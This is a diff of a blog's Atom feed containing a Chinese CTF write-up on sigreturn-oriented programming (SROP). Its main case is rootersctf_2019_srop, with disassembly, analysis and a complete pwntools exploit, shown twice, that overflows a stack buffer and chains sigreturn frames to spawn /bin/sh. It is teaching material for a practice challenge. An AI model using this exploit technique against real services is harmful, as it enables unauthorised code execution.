class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)<span class="comment">#Important!!!!!!</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./srop'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',25453)</span></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr</span><br><span class="line">frame.rbp = addr</span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><code>context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)#Important!!!!!!</code>这个一定要有，不然frame构造出来可能就不太对了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/21548933_p0.jpg" alt></p>]]></content>
+    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/32387154_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很久之前就听大佬说过SROP了，前几天也通过SROP技术做出来一道题目，不过是看的别人WP之后才会的。</p><p>今天具体学习了一下SROP技术，先贴几个参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_12" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">FreeBuf</a></p><blockquote><p>需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行。</p></blockquote><p>形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,<span class="number">15</span>;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure><p>这种可以直接send(str(frame))</p><p>但形如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">syscall(<span class="number">15L</span>L, &amp;buf);</span><br></pre></td></tr></table></figure><p>这种需要send(str(frame)[8:])</p><p>前八个是调用rt_sigreturn函数的 ?</p><p>本文通过三道题目来练习这项技术，题目按照顺序来的<del>层层递进</del></p><h1 id="0x01-Ciscn-2019-s-3"><a href="#0x01-Ciscn-2019-s-3" class="headerlink" title="0x01 Ciscn_2019_s_3"></a>0x01 Ciscn_2019_s_3</h1><p>这道题目也就是我刚刚说过的通过别人的WP第一次了解SROP并用这技术做出来的题目。</p><p><strong>这道题目的特点在于</strong></p><ol><li>题目已经给了<code>mov rax,59(对应execve系统调用)</code>、<code>mov rax,15(对应sigreturn系统调用)</code></li><li>SROP能够利用到的gadgets是<code>syscall; ret</code></li></ol><p>因为之前我已经专门更过这道题的博客了，所以这里直接放链接</p><p><a href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/">传送门</a></p><h1 id="0x02-smallest-pwn"><a href="#0x02-smallest-pwn" class="headerlink" title="0x02 smallest pwn"></a>0x02 smallest pwn</h1><p>这是CTF-WIKI上面给的一道例题。</p><p><strong>这道题目的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>相比上一道题目，没有给出<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>需要通过程序的read系统调用的读入字节数来设置rax的值。</li><li>SROP能够利用的gadgets是<code>syscall;ret</code></li></ol><p>这道题目有一个博主已经讲解的非常详细了，而且最后这位博主画的流程图很直观，我再写也只能是模仿，很难再超越了。这里直接给出链接了</p><p><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">简书</a></p><h1 id="0x03-rootersctf-2019-srop"><a href="#0x03-rootersctf-2019-srop" class="headerlink" title="0x03 rootersctf_2019_srop"></a>0x03 rootersctf_2019_srop</h1><p>这是BUUCTF上的一道题目</p><p><strong>这道题的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>依然没有<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>存在<code>pop rax</code></li><li>能够利用的gadgets是<code>pop rax;syscall;leave;ret</code>和<code>syscall;leave;ret</code>（可以注意到相比前两道题目，syscall和ret之间多了一个leave</li></ol><h2 id="0x001-分析"><a href="#0x001-分析" class="headerlink" title="0x001 分析"></a>0x001 分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>程序只开了NX保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 sub_401000      proc near               ; CODE XREF: start↓p</span><br><span class="line">.text:0000000000401000                                         ; DATA XREF: LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 buf             = byte ptr -80h</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000                 push    rbp</span><br><span class="line">.text:0000000000401001                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401004                 sub     rsp, 40h</span><br><span class="line">.text:0000000000401008                 mov     eax, 1</span><br><span class="line">.text:000000000040100D                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401012                 lea     rsi, buf        ; &quot;Hey, can i get some feedback for the CT&quot;...</span><br><span class="line">.text:000000000040101A                 mov     edx, 2Ah        ; count</span><br><span class="line">.text:000000000040101F                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000401021                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401026                 lea     rsi, [rsp+40h+buf] ; buf</span><br><span class="line">.text:000000000040102B                 mov     edx, 400h       ; count</span><br><span class="line">.text:0000000000401030                 push    0</span><br><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br><span class="line">.text:0000000000401036 sub_401000      endp</span><br><span class="line">.text:0000000000401036</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; Attributes: noreturn</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037                 public start</span><br><span class="line">.text:0000000000401037 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401037                 call    sub_401000</span><br><span class="line">.text:000000000040103C                 mov     eax, 3Ch</span><br><span class="line">.text:0000000000401041                 mov     edi, 0          ; error_code</span><br><span class="line">.text:0000000000401046                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.text:0000000000401046 start           endp</span><br><span class="line">.text:0000000000401046</span><br><span class="line">.text:0000000000401046 _text           ends</span><br><span class="line">.text:0000000000401046</span><br></pre></td></tr></table></figure><p>程序只有两个函数，一个是调用了write和read的函数，另一个是调用exit的函数。</p><p>很明显可以看到read处存在栈溢出，可以用SROP来做。</p><h2 id="0x002-思路"><a href="#0x002-思路" class="headerlink" title="0x002 思路"></a>0x002 思路</h2><p>由于程序没有<code>/bin/sh</code>，我们需要找到一个位置写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code>。</p><p>可以先通过程序自带的一次read进行栈溢出来执行一次sigreturn系统调用，使其能够向指定位置写入<code>/bin/sh</code>，然后再次进行sigreturn系统调用执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><p>如何连续进行两次sigreturn系统调用？这里就需要构造SROP链了。<strong>例题2也是构造的SROP链</strong></p><h2 id="0x003-Let’s-do-it"><a href="#0x003-Let’s-do-it" class="headerlink" title="0x003 Let’s do it!"></a>0x003 Let’s do it!</h2><p>我们需要先找到一个位置用来写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311222501.png" alt></p><p>可以看到程序的<code>DATA区</code>权限符合我们的要求。这里选择<code>addr = 0x402100</code>吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br></pre></td></tr></table></figure><p>然后通过SROP执行一次read系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read(0,addr,300)</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr<span class="comment">#注意这里！~</span></span><br><span class="line">frame.rbp = addr<span class="comment">#</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br></pre></td></tr></table></figure><p>然后向addr写入<code>/bin/sh</code>并再次进行sigreturn系统调用，执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>注意第一次构造frame的时候，我们设置了frame.rsp = addr，frame.rbp = addr，这是因为由于我们的gadgets是<code>syscall;leave;ret</code>，中间有个<code>leave</code>，<code>leave</code>就相当于<code>mov rsp,rbp;pop rbp</code>，为了构造SROP链，我们需要让rsp指向我们下一个payload的地址(这个可以参考第二个例题)，但如果我们的rbp为0的话，<code>leave</code>以后rsp也为0，这显然不符合我们的要求，所以这个需要<code>让rbp=addr</code>。</p><p>但由于<code>leave</code>还有一个<code>pop rbp</code>的功能，这里构造就较为巧妙，我们addr的位置前8字节正好被写为<code>/bin/sh\x00</code>，这样当我们ret的时候，正好能将<code>p64(pop_rax_syscall_leave_ret)</code>传给rip来执行，然后进行下一次sigreturn系统调用。</p><h2 id="0x004-完整EXP"><a href="#0x004-完整EXP" class="headerlink" title="0x004 完整EXP"></a>0x004 完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)<span class="comment">#Important!!!!!!</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./srop'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',25453)</span></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr</span><br><span class="line">frame.rbp = addr</span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><code>context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)#Important!!!!!!</code>这个一定要有，不然frame构造出来可能就不太对了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/21548933_p0.jpg" alt></p>]]></content>
     
     <summary type="html">
     
@@ -331,15 +331,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>[Hackme.inndy] onepunch</title>
-    <link href="http://yoursite.com/2020/03/11/Hackme-inndy-onepunch/"/>
-    <id>http://yoursite.com/2020/03/11/Hackme-inndy-onepunch/</id>
+    <link href="http://liul14n.top/2020/03/11/Hackme-inndy-onepunch/"/>
+    <id>http://liul14n.top/2020/03/11/Hackme-inndy-onepunch/</id>
     <published>2020-03-10T17:17:48.000Z</published>
     <updated>2020-03-28T19:21:18.396Z</updated>
     
@@ -351,15 +351,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>Ciscn_2019_s_3</title>
-    <link href="http://yoursite.com/2020/03/07/Ciscn-2019-s-3/"/>
-    <id>http://yoursite.com/2020/03/07/Ciscn-2019-s-3/</id>
+    <link href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/"/>
+    <id>http://liul14n.top/2020/03/07/Ciscn-2019-s-3/</id>
     <published>2020-03-07T12:44:11.000Z</published>
     <updated>2020-10-07T06:59:40.105Z</updated>
     
@@ -371,15 +371,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>0CTF 2017 babyheap</title>
-    <link href="http://yoursite.com/2020/03/02/0CTF-2017-babyheap/"/>
-    <id>http://yoursite.com/2020/03/02/0CTF-2017-babyheap/</id>
+    <link href="http://liul14n.top/2020/03/02/0CTF-2017-babyheap/"/>
+    <id>http://liul14n.top/2020/03/02/0CTF-2017-babyheap/</id>
     <published>2020-03-02T09:00:42.000Z</published>
     <updated>2020-03-22T17:03:06.705Z</updated>
     
@@ -391,15 +391,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>get_started_3dsctf_2016</title>
-    <link href="http://yoursite.com/2020/02/25/get-started-3dsctf-2016/"/>
-    <id>http://yoursite.com/2020/02/25/get-started-3dsctf-2016/</id>
+    <link href="http://liul14n.top/2020/02/25/get-started-3dsctf-2016/"/>
+    <id>http://liul14n.top/2020/02/25/get-started-3dsctf-2016/</id>
     <published>2020-02-25T14:11:45.000Z</published>
     <updated>2020-02-25T15:17:38.403Z</updated>
     
@@ -411,7 +411,7 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
